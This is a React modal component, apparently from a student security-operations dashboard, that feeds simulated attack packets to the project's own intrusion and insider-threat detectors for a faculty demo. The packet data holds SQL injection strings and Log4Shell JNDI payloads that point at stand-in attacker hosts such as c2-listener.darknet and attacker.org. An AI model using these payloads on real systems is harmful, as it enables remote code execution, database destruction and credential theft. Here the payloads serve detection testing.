/* eslint-disable no-template-curly-in-string, no-useless-concat */
import React, { useState } from 'react';
import {
  Zap,
  ShieldAlert,
  Database,
  Radio,
  UserCheck,
  Terminal,
  Play,
  CheckCircle2,
  X,
  Flame,
  AlertTriangle,
  ExternalLink
} from 'lucide-react';
import { nidsService } from '../../services/nidsService';
import { insiderService } from '../../services/insiderService';
import { useSOC } from '../../context/SOCContext';
import { useNavigate } from 'react-router-dom';

export const AttackSimulatorModal = ({ isOpen, onClose }) => {
  const { fetchIncidents, fetchDefenseStatus } = useSOC();
  const navigate = useNavigate();
  const [selectedScenario, setSelectedScenario] = useState('sqli');
  const [executing, setExecuting] = useState(false);
  const [executionLog, setExecutionLog] = useState(null);

  if (!isOpen) return null;

  const scenarios = [
    {
      id: 'sqli',
      title: 'SQL Injection & Data Exfiltration (DPI Exploit)',
      type: 'External Web Application Attack',
      severity: 'CRITICAL',
      icon: Database,
      color: 'rose',
      description:
        'Dispatches SQL syntax payloads (UNION SELECT, OR 1=1, DROP TABLE) to test the Deep Packet Inspection (DPI) pattern matcher and automated firewall blocking.',
      expected: 'DPI Rule Flagged -> CRITICAL Severity -> Attacker IP Instantly Blocked -> Honeypot Reroute.'
    },
    {
      id: 'ddos',
      title: 'DDoS Volumetric Syn Flood',
      type: 'Layer 4 Network Protocol Attack',
      severity: 'HIGH',
      icon: Flame,
      color: 'amber',
      description:
        'Transmits high-frequency packet bursts with sub-millisecond inter-arrival times to trigger the LightGBM ML model.',
      expected: 'LightGBM ML Flagged (Confidence > 95%) -> Volumetric Anomaly -> Incident Persisted.'
    },
    {
      id: 'portscan',
      title: 'Aggressive Multi-Port Reconnaissance Scan',
      type: 'Network Reconnaissance Probe',
      severity: 'MEDIUM',
      icon: Radio,
      color: 'cyan',
      description:
        'Probes critical services across ports 21 (FTP), 22 (SSH), 80 (HTTP), 443 (HTTPS), and 3389 (RDP) to simulate network discovery.',
      expected: 'PortScan Multi-class Vector Detected -> Threat Fingerprint Indexed -> Threat Memory Updated.'
    },
    {
      id: 'log4shell',
      title: 'Log4Shell / JNDI Remote Code Execution (CVE-2021-44228)',
      type: 'Zero-Day / Exploit String Injection',
      severity: 'CRITICAL',
      icon: Zap,
      color: 'purple',
      description:
        'Injects JNDI LDAP (${""}jndi:ldap://...) malicious strings in HTTP headers and parameters to verify Zero-Day anomaly classification.',
      expected: 'DPI & Zero-Day Scorer Triggered -> Severity CRITICAL -> Active Defense Execution.'
    },
    {
      id: 'insider',
      title: 'Malicious Insider Data Exfiltration (CERT r4.2)',
      type: 'Insider Threat / Behavioral Anomaly (UEBA)',
      severity: 'HIGH',
      icon: UserCheck,
      color: 'emerald',
      description:
        'Submits an unauthorized external USB drive event under rogue account ACM2278 with keywords: "exfiltrate", "malware", "leak".',
      expected: 'Isolation Forest Model Flagged -> Keyword Signature Matched -> UEBA Risk Score Elevated.'
    }
  ];

  const handleRunSimulation = async () => {
    setExecuting(true);
    setExecutionLog(null);

    const now = new Date().toISOString();
    const attackerOctet = Math.floor(Math.random() * 200) + 10;

    try {
      if (selectedScenario === 'sqli') {
        const attackerIp = `185.220.101.${attackerOctet}`;
        const packets = [
          {
            timestamp: now,
            src_ip: attackerIp,
            dst_ip: '10.0.0.15',
            src_port: 54321,
            dst_port: 80,
            protocol: 'TCP',
            payload: "GET /api/v1/auth/login?username=' OR '1'='1&pass=x HTTP/1.1"
          },
          {
            timestamp: now,
            src_ip: attackerIp,
            dst_ip: '10.0.0.15',
            src_port: 54322,
            dst_port: 80,
            protocol: 'TCP',
            payload: "POST /query HTTP/1.1 UNION SELECT username, password_hash, token FROM staff_users;--"
          },
          {
            timestamp: now,
            src_ip: attackerIp,
            dst_ip: '10.0.0.15',
            src_port: 54323,
            dst_port: 80,
            protocol: 'TCP',
            payload: 'DROP TABLE audit_trail;--'
          },
          {
            timestamp: now,
            src_ip: attackerIp,
            dst_ip: '10.0.0.15',
            src_port: 54324,
            dst_port: 80,
            protocol: 'TCP',
            payload: 'SELECT * FROM credit_cards WHERE 1=1'
          }
        ];
        const res = await nidsService.predict(packets);
        setExecutionLog({
          target: 'Port 5005 (NIDS ML & DPI)',
          attacker: attackerIp,
          victim: '10.0.0.15',
          classification: res.classification,
          severity: res.threat_severity,
          category: res.category,
          action: res.action_taken,
          dpi: res.dpi,
          risk: res.risk_score
        });
      } else if (selectedScenario === 'ddos') {
        const attackerIp = `198.51.100.${attackerOctet}`;
        const packets = [];
        const base = Date.now();
        for (let i = 0; i < 5; i++) {
          packets.push({
            timestamp: new Date(base + i).toISOString(),
            src_ip: attackerIp,
            dst_ip: '10.0.0.1',
            src_port: 40000 + i,
            dst_port: 80,
            protocol: 'TCP',
            payload: 'SYN_FLOOD_VOLUMETRIC_BURST'
          });
        }
        const res = await nidsService.predict(packets);
        setExecutionLog({
          target: 'Port 5005 (NIDS ML & DPI)',
          attacker: attackerIp,
          victim: '10.0.0.1',
          classification: res.classification,
          severity: res.threat_severity,
          category: res.category,
          action: res.action_taken,
          risk: res.risk_score
        });
      } else if (selectedScenario === 'portscan') {
        const attackerIp = `194.26.29.${attackerOctet}`;
        const ports = [21, 22, 80, 443, 3389];
        const base = Date.now();
        const packets = ports.map((p, idx) => ({
          timestamp: new Date(base + idx * 5).toISOString(),
          src_ip: attackerIp,
          dst_ip: '10.0.0.1',
          src_port: 55000 + idx,
          dst_port: p,
          protocol: 'TCP',
          payload: `PROBE_PORT_${p}`
        }));
        const res = await nidsService.predict(packets);
        setExecutionLog({
          target: 'Port 5005 (NIDS ML & DPI)',
          attacker: attackerIp,
          victim: '10.0.0.1',
          classification: res.classification,
          severity: res.threat_severity,
          category: res.category,
          action: res.action_taken,
          risk: res.risk_score
        });
      } else if (selectedScenario === 'log4shell') {
        const attackerIp = `103.145.20.${attackerOctet}`;
        const packets = [
          {
            timestamp: now,
            src_ip: attackerIp,
            dst_ip: '10.0.0.8',
            src_port: 49152,
            dst_port: 8080,
            protocol: 'TCP',
            payload: '$' + '{jndi:ldap://c2-listener.darknet:1389/ExploitPayload}'
          },
          {
            timestamp: now,
            src_ip: attackerIp,
            dst_ip: '10.0.0.8',
            src_port: 49153,
            dst_port: 8080,
            protocol: 'TCP',
            payload: 'User-Agent: $' + '{jndi:rmi://103.145.20.5:1099/Object}'
          },
          {
            timestamp: now,
            src_ip: attackerIp,
            dst_ip: '10.0.0.8',
            src_port: 49154,
            dst_port: 8080,
            protocol: 'TCP',
            payload: 'X-Forwarded-For: $' + '{jndi:dns://attacker.org/rce}'
          },
          {
            timestamp: now,
            src_ip: attackerIp,
            dst_ip: '10.0.0.8',
            src_port: 49155,
            dst_port: 8080,
            protocol: 'TCP',
            payload: 'RCE Exploit Trigger Verification'
          }
        ];
        const res = await nidsService.predict(packets);
        setExecutionLog({
          target: 'Port 5005 (NIDS ML & DPI)',
          attacker: attackerIp,
          victim: '10.0.0.8',
          classification: res.classification,
          severity: res.threat_severity,
          category: res.category,
          action: res.action_taken,
          dpi: res.dpi,
          risk: res.risk_score
        });
      } else if (selectedScenario === 'insider') {
        const payload = {
          user: 'ACM2278',
          event_type: 'DEVICE',
          activity: 'Connect',
          timestamp: now,
          details: JSON.stringify({
            pc: 'PC-FINANCE-02',
            activity: 'Connect',
            file_tree: 'D:\\Classified\\Restricted_Customer_Vault.db',
            keywords: 'exfiltrate malware password leak dump breach confidential'
          })
        };
        const res = await insiderService.ingestEvent(payload);
        setExecutionLog({
          target: 'Port 5001 (Insider Threat UEBA)',
          attacker: 'ACM2278 (Finance Dept)',
          victim: 'Internal Network Asset',
          classification: res.is_anomaly ? 'ANOMALOUS / THREAT' : 'NORMAL',
          severity: res.risk_score >= 0.8 ? 'CRITICAL' : res.risk_score >= 0.6 ? 'HIGH' : 'MEDIUM',
          category: res.detection_method || 'Isolation Forest & Keyword Scanner',
          action: 'Alert Logged to SQLite & Incident Flagged',
          risk: Math.round(res.risk_score * 100)
        });
      }

      // Re-sync dashboard state
      await Promise.all([fetchIncidents?.(), fetchDefenseStatus?.()]);
    } catch (err) {
      console.error('Attack execution failed:', err);
      setExecutionLog({
        error: err.response?.data?.error || err.message || 'Simulation execution failed'
      });
    } finally {
      setExecuting(false);
    }
  };

  const cur = scenarios.find((s) => s.id === selectedScenario);

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/75 backdrop-blur-sm">
      <div className="bg-[#0b101b] border border-rose-500/40 rounded-2xl w-full max-w-4xl shadow-2xl shadow-rose-950/40 overflow-hidden flex flex-col max-h-[90vh]">
        {/* Header */}
        <div className="px-6 py-4 bg-gradient-to-r from-rose-950/40 via-red-900/20 to-transparent border-b border-rose-500/20 flex items-center justify-between">
          <div className="flex items-center gap-3">
            <div className="w-9 h-9 rounded-xl bg-rose-500/20 border border-rose-500/40 flex items-center justify-center text-rose-400 shadow-lg shadow-rose-500/20">
              <ShieldAlert className="w-5 h-5" />
            </div>
            <div>
              <h2 className="text-sm font-bold text-white uppercase tracking-wider flex items-center gap-2">
                CASOC Live Red-Team Penetration & Threat Simulator
              </h2>
              <p className="text-[11px] text-gray-400 font-mono">
                Faculty Showcase &bull; Injects real packet telemetry to prove real-time detection & active defense
              </p>
            </div>
          </div>

          <button
            onClick={onClose}
            className="p-1.5 rounded-lg text-gray-400 hover:text-white bg-white/5 border border-white/10 hover:border-white/20 transition-all"
          >
            <X className="w-4 h-4" />
          </button>
        </div>

        {/* Content Body */}
        <div className="p-6 grid grid-cols-1 md:grid-cols-12 gap-6 overflow-y-auto">
          {/* Scenario Selector Column */}
          <div className="md:col-span-5 space-y-2">
            <div className="text-[10px] font-bold uppercase tracking-wider text-gray-400 font-mono mb-2">
              Select Attack Vector to Showcase
            </div>

            {scenarios.map((sc) => {
              const Icon = sc.icon;
              const isSelected = sc.id === selectedScenario;
              return (
                <div
                  key={sc.id}
                  onClick={() => {
                    setSelectedScenario(sc.id);
                    setExecutionLog(null);
                  }}
                  className={`p-3 rounded-xl border cursor-pointer transition-all ${
                    isSelected
                      ? 'bg-rose-500/15 border-rose-500/60 shadow-lg shadow-rose-950/40'
                      : 'bg-[#101726] border-white/5 hover:border-white/20 hover:bg-white/[0.03]'
                  }`}
                >
                  <div className="flex items-start justify-between gap-2">
                    <div className="flex items-center gap-2.5">
                      <div
                        className={`w-7 h-7 rounded-lg flex items-center justify-center ${
                          isSelected ? 'bg-rose-500 text-white' : 'bg-white/5 text-gray-400'
                        }`}
                      >
                        <Icon className="w-4 h-4" />
                      </div>
                      <div className="font-bold text-xs text-white">{sc.title}</div>
                    </div>
                    <span
                      className={`text-[9px] font-bold px-1.5 py-0.5 rounded font-mono ${
                        sc.severity === 'CRITICAL'
                          ? 'bg-rose-500/20 text-rose-400 border border-rose-500/40'
                          : sc.severity === 'HIGH'
                          ? 'bg-amber-500/20 text-amber-400 border border-amber-500/40'
                          : 'bg-cyan-500/20 text-cyan-400 border border-cyan-500/40'
                      }`}
                    >
                      {sc.severity}
                    </span>
                  </div>
                  <div className="text-[10px] text-gray-400 font-mono mt-1 pl-9">
                    {sc.type}
                  </div>
                </div>
              );
            })}
          </div>

          {/* Scenario Details & Execution Column */}
          <div className="md:col-span-7 flex flex-col justify-between space-y-4">
            <div className="space-y-4">
              {/* Selected Card Header */}
              <div className="p-4 rounded-xl bg-[#101726] border border-white/10 space-y-2">
                <div className="flex items-center justify-between">
                  <span className="text-xs font-bold text-white uppercase tracking-wider flex items-center gap-2">
                    <Zap className="w-4 h-4 text-rose-400" />
                    Target Vector Analysis
                  </span>
                  <span className="text-[10px] font-mono text-cyan-400">
                    Live Socket.IO Sync Ready
                  </span>
                </div>

                <div className="text-xs text-gray-300 leading-relaxed">
                  {cur?.description}
                </div>

                <div className="pt-2 border-t border-white/5 text-[11px] font-mono text-emerald-400 flex items-start gap-1.5">
                  <CheckCircle2 className="w-3.5 h-3.5 mt-0.5 flex-shrink-0" />
                  <span>
                    <strong className="text-gray-300">Expected SOC Reaction:</strong> {cur?.expected}
                  </span>
                </div>
              </div>

              {/* Execution Console Output */}
              <div className="p-4 rounded-xl bg-black/60 border border-white/10 font-mono text-xs space-y-2">
                <div className="flex items-center justify-between text-[11px] text-gray-400 border-b border-white/10 pb-1.5">
                  <span className="flex items-center gap-1.5">
                    <Terminal className="w-3.5 h-3.5 text-cyan-400" />
                    Backend Live Telemetry Response
                  </span>
                  <span className="text-[10px] text-gray-500">
                    {executing ? 'Transmitting...' : executionLog ? 'Attack Captured' : 'Ready'}
                  </span>
                </div>

                {executing ? (
                  <div className="py-8 text-center text-cyan-400 animate-pulse space-y-2">
                    <div className="w-5 h-5 border-2 border-cyan-400 border-t-transparent rounded-full animate-spin mx-auto" />
                    <div>Injecting packet stream & triggering backend ML / DPI pipeline...</div>
                  </div>
                ) : executionLog ? (
                  <div className="space-y-2 text-[11px] text-gray-200">
                    {executionLog.error ? (
                      <div className="text-rose-400 font-bold flex items-center gap-2">
                        <AlertTriangle className="w-4 h-4" />
                        {executionLog.error}
                      </div>
                    ) : (
                      <>
                        <div className="grid grid-cols-2 gap-2 text-[11px]">
                          <div>
                            <span className="text-gray-500">Destination Engine:</span>{' '}
                            <span className="text-white font-bold">{executionLog.target}</span>
                          </div>
                          <div>
                            <span className="text-gray-500">Attacker IP:</span>{' '}
                            <span className="text-rose-400 font-bold">{executionLog.attacker}</span>
                          </div>
                          <div>
                            <span className="text-gray-500">Detection Vector:</span>{' '}
                            <span className="text-cyan-400 font-bold">{executionLog.category}</span>
                          </div>
                          <div>
                            <span className="text-gray-500">Risk Score:</span>{' '}
                            <span className="text-amber-400 font-bold">{executionLog.risk}/100</span>
                          </div>
                        </div>

                        <div className="p-2 rounded bg-rose-500/10 border border-rose-500/30 text-[11px] text-rose-300">
                          <strong>Active Mitigation Triggered:</strong> {executionLog.action}
                        </div>

                        <div className="text-[10px] text-emerald-400 flex items-center gap-1 mt-1">
                          <CheckCircle2 className="w-3 h-3" />
                          Broadcasted live via WebSocket. Dashboard & Incident logs updated in real-time.
                        </div>
                      </>
                    )}
                  </div>
                ) : (
                  <div className="py-6 text-center text-gray-500 text-[11px]">
                    Click "Launch Attack Simulation" below. Watch the backend evaluate features, block the IP, and flash on the live dashboard.
                  </div>
                )}
              </div>
            </div>

            {/* Launch Actions */}
            <div className="flex items-center justify-between gap-3 pt-2">
              <button
                onClick={handleRunSimulation}
                disabled={executing}
                className="flex-1 py-3 px-4 rounded-xl bg-gradient-to-r from-rose-600 via-red-600 to-rose-700 hover:from-rose-500 hover:to-rose-600 text-white font-bold text-xs uppercase tracking-wider flex items-center justify-center gap-2 shadow-xl shadow-rose-950/50 border border-rose-400/30 transition-all active:scale-[0.98] disabled:opacity-50"
              >
                <Play className="w-4 h-4 fill-white" />
                {executing ? 'Transmitting Attack...' : 'Launch Attack In Front of Faculty'}
              </button>

              {executionLog && !executionLog.error && (
                <button
                  onClick={() => {
                    onClose();
                    navigate('/incidents');
                  }}
                  className="py-3 px-4 rounded-xl bg-cyan-500/20 hover:bg-cyan-500/30 text-cyan-300 border border-cyan-500/40 text-xs font-bold font-mono flex items-center gap-2 transition-all"
                >
                  View In Incidents <ExternalLink className="w-3.5 h-3.5" />
                </button>
              )}
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};
